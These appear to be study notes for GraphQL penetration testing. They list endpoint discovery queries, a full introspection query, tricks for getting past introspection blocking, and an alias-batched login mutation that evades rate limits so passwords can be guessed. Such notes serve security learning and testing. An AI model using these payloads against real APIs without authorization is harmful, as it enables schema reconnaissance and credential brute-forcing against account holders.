//! Identifying
//* send universel query
// query{__typename}
//* to common endpoitns
// /graphql
// /api
// /api/graphql
// /graphql/api
// /graphql/graphql
//? Discovering schema information
// {
//  "query": "{__schema{queryType{name}}}"
// }
//* for more detailed schema
// https://portswigger.net/web-security/graphql
// {
// "query": "query IntrospectionQuery {\n  __schema {\n    queryType { name }\n    mutationType { name }\n    types {\n      kind\n      name\n      description\n      fields(includeDeprecated: true) {\n        name\n        description\n        args {\n          ...InputValue\n        }\n        type {\n          ...TypeRef\n        }\n        isDeprecated\n        deprecationReason\n      }\n      inputFields {\n        ...InputValue\n      }\n      interfaces {\n        ...TypeRef\n      }\n      enumValues(includeDeprecated: true) {\n        name\n        description\n        isDeprecated\n        deprecationReason\n      }\n      possibleTypes {\n        ...TypeRef\n      }\n    }\n    directives {\n      name\n      description\n      args {\n        ...InputValue\n      }\n      locations\n    }\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type { ...TypeRef }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType { kind name }\n      }\n    }\n  }\n}"
// }
//* for visualization
// https://graphql-kit.com/graphql-voyager/
//? Bypassing GraphQL introspection defenses
// try adding spaces, commas, or newlines after __schema
// change the content type to x-www-form-urlencoded and send it as a get request with a parameter named query
// GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
//! Exploiting
//* Bypassing rate limiting using aliases
//  mutation login($input: LoginInput!,$input2: LoginInput!) {
//         login(input: $input) {
//             token
//             success
//         }
//         login2:login(input: $input2) {
//             token
//             success
//         }
//   }

//     {"input":{"username":"sdfsd","password":"who"},"input2":{"username":"sdfsd","password":"who"}}


